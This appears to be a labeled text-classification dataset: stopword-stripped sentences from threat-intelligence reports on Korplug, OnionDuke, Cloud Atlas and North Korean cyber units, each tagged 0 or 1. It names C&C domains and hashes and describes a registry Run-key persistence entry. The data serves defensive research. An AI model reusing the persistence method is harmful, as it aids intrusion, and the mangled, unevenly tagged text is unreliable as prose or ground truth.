Later May 2010 within Pakistani Senate question answer session Gulshan-e-Jinnah Complex cited Federal Lodges / Hostels Islamabad control Pakistan Ministry Housing Works	0
A December 2010 TheNews Pakistan ran story detailed differential rents commoners within Islamabad Pakistani government officers accommodated Gulshan-e-Jinnah	0
According Google Maps approximately 650 meters ( 8 minute walk ) Gulshan-e-Jinnah Complex Tranchulas offices within Evacuee Trust Complex	0
Within May 2013 interview Khan specified comes family strong military background	0
He detailed interest '' world hacking '' grew teen years referencing father 's diplomatic assignment Philippines 2003	0
Khan would go establish Tranchulas February 2006 independent audit Pakistani Governments National Database Registration Authority ( NADRA )	0
Digital Appendix 1 contains additional research collateral collected conducting Operation Arachnophobia research	0
Digital Appendix 2 contains raw email communications	0
These .eml	0
files include raw SMTP headers content attachments	0
Digital Appendix 3 contains screenshots web content used conduct analysis	0
Digital Appendix 4 contains visualization files depict relationships contain metadata associated Operation Arachnophobia research	0
After taking look recent Korplug ( PlugX ) detections identified two larger scale campaigns employing well-known Remote Access Trojan	1
This blog gives overview first one related Afghanistan & Tajikistan	0
The campaign targets number high-profile organizations Russia subject Anton Cherepanov 's presentation ZeroNights security conference Moscow week	0
Sometimes malware used various attacks unique enough identify related incidents makes tracking individual botnets simpler	0
An example BlackEnergy Lite variant ( also known BlackEnergy 3 ) used group attackers ( given name Quedagh Sandworm ) targets Ukraine countries	0
BlackEnergy Lite clearly distinguishable numerous binaries common BlackEnergy 2 also circulating in-the-wild	0
In cases attackers use common tools accomplishing criminal goals	0
For example Korplug RAT ( a.k.a .PlugX ) well-known toolkit associated Chinese APT groups used large number targeted attacks since 2012	1
For past several weeks taken closer look great number detections malware many unrelated incidents	0
Among able discover several successful infections employed Korplug samples connecting C & C domain	1
Other Korplug samples connecting different domain name resolving IPs notebookhk.net Taking C & Cs starting point able locate number victims infected various exploit-laden spear-phishing documents cunningly-named archives	1
A table selection RTF documents RAR self-extracting archives .SCR	0
extension shown Some above-mentioned files also contained decoy documents In cases three binary files dropped ( apart decoy documents ) led Korplug trojan loading memory	1
The Korplug RAT known use side-loading trick abusing legitimate digitally signed executables way stay radar since trusted application valid signature among startup items less likely raise suspicion	1
The maliciously crafted documents RTF files successfully exploit CVE-2012-0158 vulnerability Microsoft Word	1
The image shows beginning CVE-2012-0158 shellcode ASCII encoding within document ( opcodes 60 55 8bec disassemble pusha ; push ebp ; mov ebp esp )	0
Interestingly though documents also contain newer CVE-2014-1761 exploit extensively used targeted attacks carried number malware families year ( including BlackEnergy Sednit MiniDuke others )	0
However exploit implemented correctly due wrong file offset 1st stage shellcode	0
Below see disassembly 1st stage shellcode checks presence tag '' p 11 '' marking beginning 2nd stage shellcode loads memory	0
Even though tag 2nd stage shellcode present RTF 's different offset thus never loaded	0
Sophos ' Gabor Szappanos gives possible explanation malformed samples may come existence	0
ESET LiveGrid telemetry indicates attacks targets going since least June 2014 continue today	0
We able pinpoint targets residents following countries From topics files used spread malware well affected targets appears attackers interested gathering intelligence related Afghan Tajik Russian military diplomatic subjects	0
Interestingly affected victims another thing common – number RATs file stealing trojans keyloggers detected systems top Korplug RAT detection	0
One 'alternative RATs ' connecting domain also used Korplug samples	1
Since functionality tools partly overlapping Korplug left us wondering whether attackers experimenting different RATs supplementing functionality unable accomplish	0
Additional information two malware families often found accompanying Korplug infections given	0
A curious Remote Access Trojan research points Chinese connection commands listens Spanish ( translation English ) The malware manage processes services infected machine transfer files C & C server run shell commands	1
It written Delphi connects www.dicemention.com	1
Some samples contain digital signature '' Nanning weiwu Technology co. ltd ''	0
This malware written C contains several functions harvesting files victim 's hard drive according criteria set configuration file	1
Apart recursive sweep logical fixed remote drives also continually monitors attached removable media network shares listening DBTDEVICEARRIVAL events	1
In addition collecting files malware attempts gather saved passwords history visited URLs account information proxy information following applications The C & C domains used malware Some samples file stealer detected campaigns also contain signature '' Nanning weiwu Technology co. ltd '' – another indicator infections related	1
Recently research published identifying Tor exit node located Russia consistently maliciously modifying uncompressed Windows executables downloaded	1
Naturally piqued interest decided peer rabbit hole	0
Suffice say hole lot deeper expected In fact went way back notorious Russian APT family MiniDuke known used targeted attacks NATO European government agencies	0
The malware used case however version MiniDuke	0
It instead separate distinct family malware since taken calling OnionDuke	0
But lets start beginning	0
When user attempts download executable via malicious Tor exit node actually receive executable '' wrapper '' embeds original executable second malicious executable	0
By using separate wrapper malicious actors able bypass integrity checks original binary might contain	1
Upon execution wrapper proceed write disk execute original executable thereby tricking user believing everything went fine	0
However wrapper also write disk execute second executable	0
In cases observed malicious executable binary ( SHA1 a75995f94854dea8799650a2f4a97980b71199d2 detected Trojan-Dropper W32/OnionDuke.A )	0
This executable dropper containing PE resource pretends embedded GIF image file	1
In reality resource actually encrypted dynamically linked library ( DLL ) file	0
The dropper proceed decrypt DLL write disk execute	1
Once executed DLL file ( SHA1 b491c14d8cfb48636f6095b7b16555e9a575d57f detected Backdoor W32/OnionDuke.B ) decrypt embedded configuration ( shown ) attempt connect hardcoded C & C URLs specified configuration data	1
From C & Cs malware may receive instructions download execute additional malicious components	1
It noted believe five domains contacted malware innocent websites compromised malware operators dedicated malicious servers	0
Through research also able identify multiple components OnionDuke malware family	0
We instance observed components dedicated stealing login credentials victim machine components dedicated gathering information compromised system like presence antivirus software firewall	1
Some components observed downloaded executed original backdoor process components yet identify infection vector	1
Most components n't embed C & C information rather communicate controllers original backdoor process	1
One component however interesting exception	0
This DLL file ( SHA1 d433f281cf56015941a1c2cb87066ca62ea1db37 detected Backdoor W32/OnionDuke.A ) contains among configuration data different hardcoded C & C domain overpict.com also evidence suggesting component may abuse Twitter additional C & C channel	1
What makes overpict.com domain interesting originally registered 2011 alias '' John Kasai ''	0
Within two-week window '' John Kasai '' also registered following domains airtravelabroad.com beijingnewsblog.net grouptumbler.com leveldelta.com nasdaqblog.net natureinhome.com nestedmail.com nostressjob.com nytunion.com oilnewsblog.com sixsquare.net ustradecomp.com	0
This significant domains leveldelta.com grouptumbler.com previously identified C & C domains used MiniDuke	1
This strongly suggests although OnionDuke MiniDuke two separate families malware actors behind connected use shared infrastructure	0
Based compilation timestamps discovery dates samples observed believe OnionDuke operators infecting downloaded executables least since end October 2013	1
We also evidence suggesting least since February 2014 OnionDuke spread modifying downloaded executables also infecting executables .torrent files containing pirated software	1
However would seem OnionDuke family much older based older compilation timestamps also fact embedded configuration data make reference apparent version number 4 suggesting least three earlier versions family exist	0
During research also uncovered strong evidence suggesting OnionDuke used targeted attacks European government agencies although far unable identify infection vector ( )	0
Interestingly would suggest two different targeting strategies	0
On one hand '' shooting fly cannon '' mass-infection strategy modified binaries surgical targeting traditionally associated APT operations	0
In case although much still shrouded mystery speculation one thing certain	0
While using Tor may help stay anonymous time paint huge target back	0
It 's never good idea download binaries via Tor ( anything else ) without encryption	0
The problem Tor idea maintaining exit node using motives	0
VPNs ( Freedome VPN ) encrypt connection way Tor network maintainers Tor exit nodes see traffic ca n't tamper	0
Two years ago published research RedOctober complex cyber-espionage operation targeting diplomatic embassies worldwide	0
We named RedOctober started investigation October 2012 unusually hot month	0
After announcement January 2013 RedOctober operation promptly shut network C & Cs dismantled	0
As usually happens big operations considering huge investment number resources behind n't '' go away '' forever	0
Normally group goes underground months redesigns tools malware resume operations	0
See Since January 2013 've lookout possible RedOctober comeback	0
One possible hit triggered observed Mevade unusual piece malware appeared late 2013	0
The Mevade C & C name styles well technical similarities indicated connection RedOctober link weak	0
It n't August 2014 observed something made us wonder RedOctober back good	0
In August 2014 users observed targeted attacks variation CVE-2012-0158 unusual set malware	0
We quick analysis malware immediately stood certain unusual things common APT world	0
Some filenames used attacks included At least one immediately reminded us RedOctober used similarly named spearphish '' Diplomatic Car Sale.doc ''	1
As started digging operation details emerged supported theory	0
Perhaps unusual fact Microsoft Office exploit n't directly write Windows PE backdoor disk	0
Instead writes encrypted Visual Basic Script runs	1
This VBScript drops pair files disk - loader encrypted payload	1
The loader appears different every time internal strings indicate '' polymorphically '' generated	0
The payload always encrypted unique key making impossible decrypt unless DLL available	1
We observed several different spear-phishing documents drop uniquely named payloads	1
For instance '' qPd0aKJu.vbs '' file MD5 E211C2BAD9A83A6A4247EC3959E2A730 drops following files The VBS also adds registry key HKEYCURRENTUSER\Software\Microsoft\Windows\CurrentVersion\Run\ setting key '' bookstore '' value '' regsvr32 % path % \ctfmonrn.dll /s '' ensures malware runs every time system boot	1
Some DLL names observed include Some payload names include The payload includes encrypted configuration block contains information C & C sever The information config includes WebDAV URL used connections username password two folders WebDAV server used store plugins/modules malware data victim uploaded	1
The Cloud Atlas implants utilize rather unusual C & C mechanism	1
All malware samples 've seen communicate via HTTPS WebDav server '' cloudme.com '' cloud services provider	1
According website CloudMe owned operated CloudMe AB company based Linköping Sweden	0
( Important note believe CloudMe way related Cloud Atlas group - attackers simply create free accounts provider abuse command-and-control )	0
Each malware set observed far communicates different CloudMe account though	1
The attackers upload data account downloaded implant decrypted interpreted	1
In turn malware uploads replies back server via mechanism	1
Of course possible reconfigure malware use Cloud-based storage service supports WebDAV	0
Here 's look one account CloudMe The data account The files stored randomly named folder uploaded malware contain various things system information running processes current username	1
The data compressed LZMA encrypted AES however keys stored malware body makes possible decrypt information C & C	1
We previously observed one group using similar method – ItaDuke – connected accounts cloud provider mydrive.ch	1
Just like RedOctober top target Cloud Atlas Russia followed closely Kazakhstan according data Kaspersky Security Network ( KSN )	0
Actually see obvious overlap targets two subtle differences closely account geopolitical changes region happened last two years	0
Interestingly spear-phishing documents Cloud Atlas RedOctober seem exploit theme used target entity different times	1
Both Cloud Atlas RedOctober malware implants rely similar construct loader final payload stored encrypted compressed external file	0
There important differences though especially encryption algorithms used – RC4 RedOctober vs AES Cloud Atlas	0
The usage compression algorithms Cloud Altas RedOctober another interesting similarity	0
Both malicious programs share code LZMA compression algorithm	0
In CloudAtlas used compress logs decompress decrypted payload C & C servers Red October '' scheduler '' plugin uses decompress executable payloads C & C	0
It turns implementation algorithm identical malicious modules however way invoked bit different additional input sanity checks added CloudAtlas version	0
Another interesting similarity malware families configuration build system used compile binaries	0
Every binary created using Microsoft Visual Studio toolchain special header contains information number input object files version information compilers used create '' Rich '' header called magic string used identify file	0
We able identify several RedOctober binaries '' Rich '' headers describing exactly layout VC 2010 + VC 2008 object files	0
Although n't necessarily mean binaries created development computer definitely compiled using version Microsoft Visual Studio build number version using similar project configuration	0
To summarize similarities two Finally perhaps strongest connection comes targeting	0
Based observations KSN victims RedOctober also targeted CloudAtlas	1
In least one case victim 's computer attacked twice last two years two malicious programs – RedOctober Cloud Atlas	0
These details make us believe CloudAtlas represents rebirth RedOctober attacks	0
Following big announcements public exposures targeted attack operations APT groups behave predictable manner	0
Most Chinese-speaking attackers simply relocate C & C servers different place recompile malware carry nothing happened	1
Other groups nervous exposure go hibernation mode months years	0
Some may never return using tools techniques	0
However major cyber-espionage operation exposed attackers unlikely completely shut everything	0
They simply go offline time completely reshuffle tools return rejuvenated forces	0
We believe also case RedOctober makes classy return Cloud Atlas	0
Thank subscribing Episode 16 HP Security Briefing	0
In edition discuss cyber landscape within Democratic People's Republic Korea	0
The Democratic People 's Republic Korea ( DPRK ) known West North Korea unique country military-focused society unconventional technology infrastructure	0
While North Korea formerly U.S. list state sponsors terrorism removed 2008	0
However due North Korea 's hostility toward nations pursuit nuclear weapons human rights violations citizens United Nations many Western entities placed sanctions embargoes North Korea	0
For example U.S. export laws forbid sale dual-use technologies used repurposed civilian military use North Korea	0
/n 5 /fn Additionally U.S. military alliance Republic Korea ( ROK ) known West South Korea North Korea 's primary target conflict	0
Due North Korea 's global interactions cyber warfare capabilities particular interest U.S	0
According 2009 report Major Steve Sin intelligence analyst U.S	0
Forces Korea North Korean hackers successfully penetrated U.S. defense networks frequently country targeted U.S. defense assets	0
While Major Sin may overly optimistic North Korea 's abilities clear underestimated	0
Frank Cilluffo co-director Cyber Center National Economic Security George Washington University testified Congress North Korea 's cyber capability '' poses important 'wild card ' threat United States also region broader international stability… '' In April 2014 testimony given House Armed Services Committee General Curtis M. Scaparrotti noted '' North Korea remains significant threat United States ' interests security South Korea international community due willingness use force continued development proliferation nuclear weapon long- range ballistic missile programs abuse citizens ' human rights well legitimate interests neighbors international community	0
'' Scaparrotti stressed '' While North Korea 's massive conventional forces declining due aging lack resources…North Korea emphasizing development asymmetric capabilities	0
North Korea 's asymmetric arsenal includes…an active cyber warfare capability	0
'' While one would expect regime 's digital infrastructure also suffer aging lack resources factors take away technical abilities wage cyber warfare	0
While U.S. views North Korea 's cyber warfare program regime 's foray modern asymmetrical warfare South Korea views regime 's cyber capabilities terroristic threat -a build-up impending multifaceted attack	0
It important note date attack occurred	0
According report written Captain Duk-Ki Kim Republic Korea Navy officer Ph.D. '' …the North Korean regime first conduct simultaneous multifarious cyber offensive Republic Korea 's society basic infrastructure government agencies major military command centers time suppressing ROK government domestic allies supporters nuclear weapons	0
'' South Korea 's view North Korea terroristic threat may attempt downgrade North Korea politically since South Korea recognize regime legitimate state	0
South Korean reports also claim North Korea 's premier hacking unit Unit 121 trails Russia U.S. world 's third largest cyber unit	0
While claim may exaggerated 2012 South Korean reports estimated North Korea 's hacker forces around 3000 personnel	0
In July 2014 report South Korea 's Yonhap News Agency figure upgraded 5900 hacker elite	0
We must stress although claims corroborated South Korea taken regime 's cyber threats seriously reportedly training 5000 personnel defend North Korean cyber attacks	0
Obtaining details North Korea 's cyber warfare capabilities easy task	0
This paper examine known cyber capabilities North Korea 's regime country maintains secrecy matters	0
Through information obtained via open source intelligence ( OSINT ) present known North Korea 's cyber warfare supporting intelligence psychological operations capabilities	0
The following conditions proved research roadblocks gathering intelligence regarding North Korea 's cyber warfare capabilities  Much intelligence available North Korea dated may accurately reflect regime 's current capabilities	0
 Much intelligence available North Korea comes U.S. South Korean military agency reports	0
These reports omit details likely classified specific IP addresses individual actor information	0
 While South Korea ally United States reports North Korean cyber activity potentially contain incomplete biased information	0
Cultural factors stem history tension conflict two nations may skew perception make objectivity difficult	0
 North Korea 's Internet infrastructure regime 's strict control use ensures rogue actors officially sanctioned actors exercise careful OPSEC PERSEC practices order prevent inadvertent information leaks	0
In words significant identifying information form OSINT trail left behind actors	0
This hinders collection original actionable threat intelligence individual actor attribution	0
 North Korea well-isolated outside world strong intelligence psychological operations presence effectively creates confusion via counterintelligence disinformation regime 's capabilities	0
For reason '' official '' reports emanating North Korea must taken grain salt	0
This also hinders attempts obtain original actionable threat intelligence	0
In order Westerners understand North Korean mindset necessary examine key components North Korean political ideological thought	0
It also necessary provide brief explanation North Korea South Korea view one another order understand basis conflict two	0
North Korea two primary ideologies provide context regime 's motivations activities juche ( ju-cheh ) songun ( sun-goon )	0
Juche official political ideology North Korea	0
It instituted 1972 based ideologies Kim Il-Sung founder DPRK	0
Juche emphasizes self-reliance mastering revolution reconstruction one 's country independent others displaying one 's strengths defending oneself taking responsibility solving one 's problems	0
North Korea 's air-gapped intranet described exemplifies philosophy country 's cyber infrastructure	0
The juche philosophy explains North Korea 's disdain outside cultural political influence	0
Juche challenges North Koreans contribute regime 's chaju ( ja-ju ) concept national sovereignty independence	0
The regime 's greatest fear internal dissent resulting destabilization	0
In June 2014 Reddit AMA session Dr. Andrei Lankov expert North Korean culture society noted '' also serious signs public alienation discontent	0
And I rule public outbreak discontent near future	0
Of course happens serious impact government	0
'' Despite North Korea 's strong conviction juche regime collaborates receives support nations	0
However due deep-seated ideology doubtful North Korea fully trusts apparent allies	0
Later document show North Korea relies heavily China Internet access	0
North Korea also collaborates China Russia train cyber warriors longstanding political military relationships several nations	0
Songun North Korea 's '' military first '' doctrine	0
Songun emphasizes priority military resource allocation political economic affairs	0
This doctrine stems belief military vital preservation chaju	0
Understanding songun mindset gives context potential threat actor 's motivations	0
According 2013 Congressional report strategy established former leader Kim Jong-Il focused '' internal security coercive diplomacy compel acceptance diplomatic economic security interests development strategic military capabilities deter external attack challenging South Korea U.S.-South Korean alliance	0
'' North Korea 's songun permeates lives North Korean citizens	0
Article 58 North Korean Constitution states nation base nationwide defense system includes people	0
North Korea population 25 million active duty force 1.19 million personnel fourth largest world	0
The country 's reserve paramilitary units comprise 7.7 million additional personnel	0
In words third country's population serves military paramilitary capacity	0
Some North Korean youth aged 7-13 inducted Korean Children 's Union	0
The Korean Children 's Union responsible indoctrinating youths pledge build strength later defend regime	0
Children aged 14-16 begin military training members Young Red Guards paramilitary unit	0
Beginning age 17 North Koreans eligible join Reserve Military Training Unit	0
The Reserve Military Training Unit forms core North Korea 's reserves typically assigned front regional defense wartime	0
The youngest age citizen conscripted active duty unclear ; reported ages range 18-20	0
Youths volunteer active duty service age 16 17	0
The Worker-Peasant Militia Red Guards includes males ages 17-60 unmarried females ages 17-30 part active duty units Reserve Military Training Unit	0
The regime impressive number conventional weapons considering nation 's small land area population size	0
According statistics released CNN 2014 North Korea's ground arsenal includes 4100 tanks 2100 armored vehicles 8500 pieces field artillery	0
The regime 's sea weaponry includes 70 submarines 420 patrol combatants 260 amphibious landing craft	0
Their airpower includes 730 combat aircraft 300 helicopters 290 transport aircraft	0
While limits regime 's ballistic missile program unknown North Korea thought fewer 100 short-range missiles fewer 100 medium long-range missiles	0
However recent years North Korea suffered oil fuel electricity food shortages	0
Without aid another entity regime sufficient resources maintain sustain majority weapons associated personnel rapid deployment prolonged combat	0
Tension North South Korea continued well past armistice meant end Korean War	0
Neither nation recognizes legitimate state	0
South Korea 's constitution legally defines South Korean territory entire Korean peninsula adjacent islands '' North Korea '' part South Korea	0
North Korea also claims sole government Korean Peninsula	0
Each country 's claim sovereignty refusal acknowledge legitimate state creates condition perpetual conflict	0
North Korea 's negative sentiment towards U.S. stems two major factors U.S. – South Korea military alliance North Korea 's perception U.S. imperialistic prone exploitative capitalism	0
In recent years two primary factors heavily influenced current state North Korea's relations South Korea allies rise regime 's leader Kim Jong Un inauguration South Korean president Park Guen Hye	0
Kim Jong Un officially rose power April 2012 following death father Kim Jong Il December 2011	0
While age remained mystery quite time later revealed born January 1983 making age 31 present	0
This makes Kim Jong Un world 's youngest leader established nation	0
The young leader 's rise power brought several changes North Korea	0
First Kim Jong Un 's personal life public extravagant father	0
Unlike father young Kim often accompanied wife making public appearances	0
Second young Kim high-tech predecessor reported affinity luxury items avid gamer basketball fan	0
Third Kim Jong Un totalitarian father	0
Following rise power regime reportedly expanded labor camps military resources allocated target attempting defect	0
Kim also executed uncle high-ranking official share ideals	0
These moves indicate regime 's priority deter internal destabilization dissent perceived greater threat outside adversity	0
According Phil Robertson deputy Asia director Human Rights Watch '' The government recognizes accounts escaping North Koreans reveal Pyongyang 's crimes – stop people fleeing	0
'' Under Kim Jong Un 's rule regime stepped nuclear materials production propaganda distributed state media become menacing	0
The regime 's response perceived threats also become volatile	0
Christian Whiton former deputy envoy North Korea noted following Kim Jong Un 's rise power '' regime still acts belligerent manner seems less predictable random	0
'' Ellen Kim assistant director Korea Chair Center Strategic International Studies assessed situation thusly '' Since [ Kim Jong Un ] took power purged almost elder guardians ...	0
filled surroundings new faces	0
We situation learning little bit every day unpredictable behavior actions current situation North Korea lot dangerous	0
'' The regime's recent reaction upcoming film supports statements	0
The plot comedy film '' The Interview '' follows two talk show hosts asked assassinate Kim Jong Un	0
The regime even sent complaint movie UN	0
In response film North Korean official stated '' The enemies gone beyond tolerance limit despicable moves dare hurt dignity supreme leadership	0
'' The official referred movie '' undisguised terrorism war action deprive service personnel people DPRK mental mainstay bring social system	0
'' The official also issued threat '' If U.S. administration connives patronizes screening film invite strong merciless countermeasure	0
'' This reaction demonstrates North Korea 's priority preserving regime 's self-perceived dignity global arena intolerance disrespect directed Kim family	0
While tensions North South Korea persisted since Korean War tensions escalated following 2013 inauguration South Korea 's current president Park Geun Hye	0
Her platform words follows '' North Korea must keep agreements made South Korea international community establish minimum level trust second must assured consequences actions breach peace	0
To ensure stability trustpolitik applied consistently issue issue based verifiable actions steps taken mere political expediency	0
'' Shortly Park 's inauguration North Korea denounced UN Security Council Resolution 2094 '' resolution strengthening expanding scope United Nations sanctions Democratic People 's Republic Korea targeting illicit activities diplomatic personnel transfers bulk cash country 's banking relationships response country 's third nuclear test 12 February [ 2013 ]	0
'' North Korea also responded strongly joint U.S.-South Korea military exercises March 2013 noted later paper	0
North Korea 's cyber infrastructure divided two major parts outward-facing Internet connection regime-controlled intranet	0
North Korea 's outward-facing Internet connection available select individuals closely monitored activity deemed anti- regime	0
Individuals using outward-facing Internet connection must authorized	0
In 2013 Jean H. Lee Associated Press bureau chief Pyongyang stated foreigners visiting North Korea allowed Internet access firewalls	0
Common citizens limited using Kwangmyong ( gwang me-young ) nationwide intranet access world outside North Korea	0
According Lee Kwangmyong allows citizens '' access state media information sources vetted government picked pulled Internet posted intranet site	0
'' As May 2013 North Korea one '' Internet café	0
'' A 2003 report Office National Counterintelligence Executive stated North Korea 's '' Internet café '' '' place North Korea public access Internet '' foreigners allowed access Internet café	0
Whether citizens allowed access Internet location unknown	0
Star Joint Venture Co. responsible providing North Korea 's Internet access	0
Star Joint Venture Co. established Post Telecommunications Corporation cooperation Loxley Pacific Thailand	0
In December 2009 Star Joint Venture became responsible North Korea's Internet address allocation	0
Previously Internet access provided German satellite link via Korea Computer Center Europe via direct connections China Netcom later merged China Unicom	0
By October 2010 North Korea made first known direct connection Internet hosting outward-facing Korean Central News Agency website accessible global Internet	0
However many North Korea 's globally accessible websites hosted countries	0
In 2001 South Korean reports indicated North Korea joined International Telecommunications Satellite Organization ( INTELSAT )	0
As April 2012 North Korea reportedly used Intelsat connection appeared border gateway protocol ( BGP ) announcements	0
Some reports referred Intelsat connection North Korea 's backup Internet connection case China Unicom connection fails	0
A March 2013 post blog rdns.im showed North Korea longer used Intelsat connection	0
In blog post author noted method proving The Pirate Bay hosted North Korea	0
While analysis The Pirate Bay 's hosting irrelevant research detail 175.45.177.0/24 always routes AS4837 AS131279	0
AS131279 Star-KP North Korea 's Star Joint Venture Company AS4837 China Unicom	0
The author concluded '' [ traffic ] ONLY routed China Unicom NOT Intelsat	0
'' In February 2014 North Korean South Korean officials agreed extend Internet access Kaesong Industrial Zone jointly operated industrial complex north border	0
However would likely require major electrical network infrastructure expansion	0
North Korea 's electrical grid support large technological infrastructure	0
Electrical power reported unreliable sporadic many citizens receiving hours electricity per day	0
The photo ( Figure 3 ) International Space Station shows North Korea 's sparse power grid comparison surrounding nations	0
We highlighted North Korea red	0
Koryolink country 's cellular phone network tightly controlled regime	0
Cell phone data plans available users	0
Most cellular phones access Internet make domestic calls	0
According 2013 report North Korea 3G data network cellular phones	0
Visiting reporter Jean H. Lee purportedly used 3G network post Twitter Instagram	0
However citizens generally allowed use 3G network	0
Email also regulated regime	0
The first email provider North Korea Silibank	0
Silibank servers Pyongyong Shenyang joint venture China	0
The North Korean Silibank homepage silibank.net Chinese homepage silibank.com	0
In order use email service users initially register provide personal information pay registration fee monthly service fees	0
This registration information current 2001	0
However unknown whether process still applies	0
WHOIS records silibank.net show site registered anonymously via Japanese registrar	0
This information found Appendix A end paper	0
Korea Computer Center ( KCC ) North Korea 's leading government research center information technology	0
KCC eleven regional information centers eight development production centers	0
Other countries KCC branch offices include China Syria Germany United Arab Emirates	0
KCC vested interest Linux research responsible development North Korea 's national operating system Red Star OS discussed detail	0
KCC 's projects included proprietary search engine document writer game called Jang-Gi Kwangmyong intranet food study program Korean input method editor pen-based English-Korean Korean-English translator Korean voice recognition software video conferencing system distance education system SilverStar Paduk software HMS Player Samjiyon tablet	0
In addition research development KCC also monitors websites foreign government business entities conducts technical reconnaissance blueprint technical specifications vulnerabilities foreign systems technologies	0
KCC also involved clandestine information cyber operations serving command center	0
North Korea 's proprietary operating system Red Star OS	0
The development Linux-based operating system started 2002	0
Red Star OS offered Korean language features proprietary software including Naenara ( Firefox-based browser ) well text editor email client audio video players games	0
Red Star OS 's keyboard layouts include Korean English Russian Chinese Japanese	0
Regime ideals extend Red Star OS	0
The readme file goes installation disc reportedly includes quote Kim Jong-Il regarding importance North Korea Linux-based operating system compatible Korean traditions	0
While prior versions Red Star KDE-based version 3.0 mimics Apple 's OS X	0
This could indicate regime leader Kim Jong Un 's preference OS X environment Kim reportedly uses iMac	0
Citizens need permission obtain Red Star OS	0
However purchase computers heavily regulated	0
The OS 's design suggests developed means regime monitor user activity	0
North Korea known use two IP ranges	0
175.45.176.0/22 North Korea 's IP block	0
Additionally North Korea 's Telecommunications Ministry registered user China Unicom IP range 210.52.109.0/24	0
The country 's autonomous system ( AS ) number AS131279 peer AS4837 AS China Unicom	0
North Korea 's country code top-level domain ( ccTLD ) .kp	0
	0
In 2007 .kp	0
TLD initially delegated administered German-based KCC Europe	0
After KCC Europe failed maintain TLD re-delegated Star Joint Venture Company	0
The .kp	0
TLD uses following nameservers IP addresses Various U.S. U.N sanctions prohibit export dual-use technologies North Korea	0
In light North Korea managed develop hardware software hosts annual National Exhibition Invention New Technologies promote products	0
However regime historically failed attempts large-scale production electronic components	0
The country 's sparse electrical grid one major obstacles hindering large- scale manufacturing	0
Additionally famine early 1990 's negatively impacted existing manufacturing facilities regime simply capital modernize factories	0
A member World International Property Organization ( WIPO ) North Korea joined WIPO Patent Cooperation Treaty protects patents trademarks worldwide leverages intellectual property laws ensure Westerners take credit North Korean inventions	0
The regime efforts isolate citizens Western influence leverages intellectual property laws ensure Westerners take credit North Korean inventions	0
This ironic since foreign-made electronic components sometimes smuggled North Korea military use personal use regime 's upper echelon	0
A comparison scan North Korea 's IP ranges November 2010 one month North Korea made first direct connection Internet series several scans conducted May 2014 shows North Korea made significant headway establishing Internet presence	0
In November 2010 scan 175.45.176.0 - 175.45.176.16 showed variety devices including D-link Cisco Linksys HP Nokia devices Juniper networks firewall	0
Operating systems detected included FreeBSD 6.x Linux 2.6.x Red Hat Enterprise Linux	0
175.45.176.14 returned '' Naenara '' html-title	0
Most hosts 175.45.176.xx 175.45.177.xx ranges	0
As 2014 IP addresses 175.45.176.0 - 175.45.177.255 appear used websites nameservers databases email voice IP ( VoIP )	0
In November 2010 175.45.178.xx range showed hosts 175.45.179.xx range showed hosts	0
In 2014 several webservers nameservers found 175.45.178.xx range several nameservers mail servers found 175.45.179.xx range	0
This comparison demonstrates growth DPRK Internet infrastructure past four years	0
However seemingly lags behind even third world nations	0
The 2014 scans detected dated technology potentially susceptible multiple vulnerabilities consistently showed open ports active devices scanned hosts	0
It clear whether regime failed notice react scanning whether regime allows open ports devices detected spoofed serve distraction possible honeypot	0
Domains nameservers mail servers present May 2014 scan listed Appendix B end report	0
According Alexa rankings three visited websites North Korea kcna.kp official website Korean Central News Agency ( KCNA ) ; rodong.rep.kp another North Korean news site ; naenara.com.kp North Korea 's official web portal	0
Naenara translates '' country ''	0
The kcna.kp site registered using Loxley.co.th email address administrated Star Joint Venture Company	0
The WHOIS Record found Appendix A. Rodong.rep.kp registered using loxley.co.th email address also administered Star Joint Venture Company	0
The WHOIS Record site found Appendix A	0
The WHOIS information Naenara.com.kp available	0
In March 2013 reports Chrome browser blocking Naenara.com.kp due malware	0
It difficult say whether incident case North Korea serving malware whether third party took advantage improperly secured website	0
Several major North Korean websites hosted outside North Korea	0
The popular Uriminzokkiri.com website whose name translates '' nation '' hosted China	0
The administrative contact website Kim Sejun email address given contact information hyk1979 @ hotmail.com	0
The WHOIS Record site found Appendix A	0
The website Kim Il Sung Open University otherwise known '' Our Nation School '' also hosted China	0
The WHOIS record site found Appendix A	0
At top North Korea 's military structure National Defense Commission ( NDC )	0
The NDC also highest branch government regime 's supreme policymaking body	0
Along Central Committee Workers ' Party Korea Cabinet NDC top North Korea 's political hierarchy	0
Article 106 North Korea 's Constitution gives NDC following powers  The power establish policies state accordance military-first revolutionary line	0
 The power guide armed forces oversee defense building	0
 The power supervise ensure NDC chairman 's orders executed establish necessary measures	0
 The power override state decisions directives opposition NDC chairman 's decisions directives	0
 The power create remove central organs national defense sector	0
 The power create bestow military titles general-grade officer rank	0
The NDC oversees several defense intelligence bodies including Ministry State Security Ministry People 's Security Ministry People 's Armed Forces Korean People's Army	0
The Ministry State Security ( MSS ) also known State Security Department North Korea 's primary counterintelligence service	0
It considered autonomous agent regime reports directly leader Kim Jong Un	0
The MSS 's duties include oversight North Korean prison camps investigation domestic espionage repatriation defectors overseas counterespionage operations	0
The Ministry People 's Security also known Ministry Public Security ( MPS )	0
Focused domestic order oversees North Korea 's national police force conducts criminal investigations preliminary examinations oversees correctional facilities excluding prison camps	0
While roles MSS MPS focus intelligence cyber operations MSS also reportedly communications monitoring computer hacking group	0
The Ministry People 's Armed Forces ( MPAF ) administrates Korean People 's Army ( KPA ) oversees General Staff Department ( GSD ) responsible operational command control North Korea 's armed forces	0
The General Staff Department also oversees Reconnaissance General Bureau ( RGB ) North Korea 's agency clandestine operations	0
The RGB role traditional cyber operations	0
In past RGB sent agents overseas military assistance missions train insurgent groups	0
The RGB reportedly special operations forces ( SOF ) element oversees six bureaus specialize operations reconnaissance technology cyber matters overseas intelligence collection inter-Korean talks service support	0
Two bureaus identified No	0
91 Office Unit 121	0
The No	0
91 Office office responsible hacking operates Mangkyungdae-district Pyongyang	0
Unit 121 comprises intelligence component attack component	0
Unit 121 's headquarters Moonshin-dong area Pyongyang near Taedong River	0
It also components conduct operations within China	0
One Unit 121 's command posts Chilbosan Hotel Shenyang capital Liaoning Province borders North Korea	0
Shenyang Chinese military district	0
According Dr. Alexandre Mansourov expert North Korea visiting scholar U.S.-Korea Institute Johns Hopkins University '' They [ Unit 121 ] believed conducted hacking operations inside China falsify classified data disrupt U.S. South Korean systems	0
'' Both Unit 121 entity known Lab 110 reported maintain technical reconnaissance teams responsible infiltrating computer networks hacking obtain intelligence planting viruses enemy networks	0
Several entities nested Workers ' Party	0
The Central Party Committee oversees Central Party Investigative Group also known Unit 35	0
